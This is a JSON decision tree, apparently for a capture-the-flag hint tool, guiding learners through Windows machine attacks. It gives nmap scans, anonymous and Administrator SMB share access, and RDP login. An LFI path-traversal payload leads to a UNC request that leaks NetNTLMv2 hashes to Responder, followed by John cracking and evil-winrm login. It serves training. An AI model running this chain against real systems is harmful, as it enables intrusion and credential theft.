@@ -1,0 +1,174 @@
+{
+  "id": "nmap-basics-windows",
+  "title": "Windows Machine Exploitation",
+  "description": "Windows環境でのマシン攻略手順",
+  "root_node_id": "windows-root",
+  "nodes": {
+    "windows-root": {
+      "id": "windows-root",
+      "question": "Nmapスキャンを行う",
+      "hints": [
+        { "text": "sudo nmap -sS <IP> -p- --min-rate 5000 -T4 -Pn", "type": "command" },
+        { "text": "sudo nmap -sV -sC <IP> -p<PORT> -Pn", "type": "command" }
+      ],
+      "type": "select",
+      "options": [
+        {
+          "id": "opt-smb",
+          "label": "445/tcp SMB",
+          "next_node_ids": ["windows-smb-simple-1", "windows-smb-admin-1"]
+        },
+        {
+          "id": "opt-rdp",
+          "label": "3389/tcp rdp",
+          "next_node_ids": ["windows-rdp-1"]
+        },
+        {
+          "id": "opt-http",
+          "label": "80/tcp http",
+          "next_node_ids": ["windows-http-lfi-1"]
+        }
+      ]
+    },
+    "windows-smb-simple-1": {
+      "id": "windows-smb-simple-1",
+      "question": "SMB共有の列挙",
+      "hint": "smbclient -L //<IP> -N",
+      "hint_type": "command",
+      "type": "select",
+      "options": [
+        {
+          "id": "opt-smb-simple-share",
+          "label": "パスワードなしで入れるshareを発見",
+          "next_node_ids": ["windows-smb-simple-2"]
+        }
+      ]
+    },
+    "windows-smb-simple-2": {
+      "id": "windows-smb-simple-2",
+      "question": "shareにアクセス",
+      "hint": "smbclient //<IP>/<share> -N",
+      "hint_type": "command",
+      "type": "select",
+      "options": [
+        {
+          "id": "opt-smb-simple-flag",
+          "label": "flag獲得！",
+          "next_node_ids": []
+        }
+      ]
+    },
+    "windows-smb-admin-1": {
+      "id": "windows-smb-admin-1",
+      "question": "管理者としてSMB共有の列挙",
+      "hint": "smbclient -L //<IP> -U Administrator",
+      "hint_type": "command",
+      "type": "select",
+      "options": [
+        {
+          "id": "opt-smb-admin-c$",
+          "label": "C$ (Admin Share)発見",
+          "next_node_ids": ["windows-smb-admin-2"]
+        }
+      ]
+    },
+    "windows-smb-admin-2": {
+      "id": "windows-smb-admin-2",
+      "question": "C$にアクセス",
+      "hint": "smbclient //<IP>/C$ -U Administrator",
+      "hint_type": "command",
+      "type": "select",
+      "options": [
+        {
+          "id": "opt-smb-admin-flag",
+          "label": "flag獲得！",
+          "next_node_ids": []
+        }
+      ]
+    },
+    "windows-rdp-1": {
+      "id": "windows-rdp-1",
+      "question": "WindowsのRDPに接続",
+      "hint": "xfreerdp3 /v:<IP> /u:administrator",
+      "hint_type": "command",
+      "type": "select",
+      "options": [
+        {
+          "id": "opt-rdp-flag",
+          "label": "flag獲得！",
+          "next_node_ids": []
+        }
+      ]
+    },
+    "windows-http-lfi-1": {
+      "id": "windows-http-lfi-1",
+      "question": "http://<IP>にアクセスし、LFI脆弱性を探索",
+      "hint": "例) http://<IP>/index.php?page=../../.././../../../../windows/system32/drivers/etc/hosts",
+      "hint_type": "text",
+      "type": "select",
+      "options": [
+        {
+          "id": "opt-http-lfi-found",
+          "label": "LFI脆弱性を発見",
+          "next_node_ids": ["windows-http-lfi-2"]
+        }
+      ]
+    },
+    "windows-http-lfi-2": {
+      "id": "windows-http-lfi-2",
+      "question": "responderを起動",
+      "hint": "sudo responder -I tun0",
+      "hint_type": "command",
+      "type": "select",
+      "options": [
+        {
+          "id": "opt-http-lfi-responder",
+          "label": "起動完了",
+          "next_node_ids": ["windows-http-lfi-3"]
+        }
+      ]
+    },
+    "windows-http-lfi-3": {
+      "id": "windows-http-lfi-3",
+      "question": "LFI脆弱性を利用し、responderに対してNTLM認証を送信させる",
+      "hint": "http://<IP>/index.php?page=//<my_machine_IP>/somefile",
+      "hint_type": "text",
+      "type": "select",
+      "options": [
+        {
+          "id": "opt-http-lfi-hash",
+          "label": "チャレンジレスポンスNetNTLMv2を取得",
+          "next_node_ids": ["windows-http-lfi-4"]
+        }
+      ]
+    },
+    "windows-http-lfi-4": {
+      "id": "windows-http-lfi-4",
+      "question": "取得したNetNTLMv2（hash.txtに保存）をパスワードクラック",
+      "hint": "john -w=<wordlist> hash.txt",
+      "hint_type": "command",
+      "type": "select",
+      "options": [
+        {
+          "id": "opt-http-lfi-cracked",
+          "label": "パスワードクラック成功",
+          "next_node_ids": ["windows-http-lfi-5"]
+        }
+      ]
+    },
+    "windows-http-lfi-5": {
+      "id": "windows-http-lfi-5",
+      "question": "取得したパスワードでWindowsにリモートアクセス（ポート5985/tcp, 5986/tcpが空いている場合）",
+      "hint": "evil-winrm -i <IP> -u <username> -p <password>",
+      "hint_type": "command",
+      "type": "select",
+      "options": [
+        {
+          "id": "opt-http-lfi-flag",
+          "label": "flag獲得！",
+          "next_node_ids": []
+        }
+      ]
+    }
+  }
+}
